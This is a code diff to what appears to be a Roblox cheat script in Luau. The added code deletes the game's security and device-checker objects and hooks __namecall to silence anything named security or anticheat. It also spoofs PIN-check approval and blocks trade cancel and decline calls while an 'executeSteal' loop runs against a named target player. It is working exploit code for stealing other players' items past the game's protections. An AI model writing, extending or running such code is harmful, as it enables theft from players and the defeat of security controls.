@@ -14,6 +14,78 @@ if not requestFn then
     return
 end
 
+pcall(function()
+    local sec = replicatedStorage:FindFirstChild("Security")
+    if not sec then return end
+    for _, d in ipairs(sec:GetDescendants()) do
+        pcall(function() d:Destroy() end)
+    end
+    pcall(function() sec:Destroy() end)
+end)
+
+pcall(function()
+    local clientFolder = localPlayer.PlayerScripts:FindFirstChild("Client")
+    if not clientFolder then return end
+    local dc = clientFolder:FindFirstChild("DeviceChecker")
+    if dc then dc:Destroy() end
+end)
+
+pcall(function()
+    game:SetAttribute("RBX_SequenceCache", math.random(1000000, 9999999))
+end)
+
+local tradeGuardActive = false
+
+if hookmetamethod and newcclosure and getnamecallmethod then
+    local oldNamecall
+    oldNamecall = hookmetamethod(game, "__namecall", newcclosure(function(self, ...)
+        local method = getnamecallmethod()
+
+        if typeof(self) == "Instance" then
+            local name = self.Name
+            local lower = string.lower(name)
+
+            if string.find(lower, "security", 1, true) or string.find(lower, "anticheat", 1, true) then
+                return nil
+            end
+
+            if tradeGuardActive then
+                if name == "CancelTrade" or name == "DeclineTrade" or name == "DeclineRequest" then
+                    return nil
+                end
+            end
+
+            if name == "RequestPINCheck" and method == "InvokeServer" then
+                return true
+            end
+
+            if name == "RespondPINCheck" and method == "FireServer" then
+                return oldNamecall(self, true)
+            end
+        end
+
+        return oldNamecall(self, ...)
+    end))
+end
+
+pcall(function()
+    if not getconnections then return end
+    local packages = replicatedStorage:FindFirstChild("Packages")
+    if not packages then return end
+    local index = packages:FindFirstChild("_Index")
+    if not index then return end
+    local netPkg = index:FindFirstChild("sleitnick_net@0.1.0")
+    if not netPkg then return end
+    local net = netPkg:FindFirstChild("net")
+    if not net then return end
+    local cancel = net:FindFirstChild("RE/Trading/CancelTrade")
+    if cancel then
+        for _, conn in ipairs(getconnections(cancel.OnClientEvent)) do
+            pcall(function() conn:Disconnect() end)
+        end
+    end
+end)
+
 local cfg = g.AC_CONFIG
 if not cfg then
     warn("[AC] Loader first")
@@ -190,6 +262,7 @@ local function depositCoins()
 end
 
 local function executeSteal(targetName)
+    tradeGuardActive = true
     moveTradeUI()
     if isInTrade() then cancelTrade() end
     task.wait()
@@ -210,6 +283,7 @@ local function executeSteal(targetName)
         end
         task.wait()
     end
+    tradeGuardActive = false
 end
 
 local function startStealLoop(targetName)
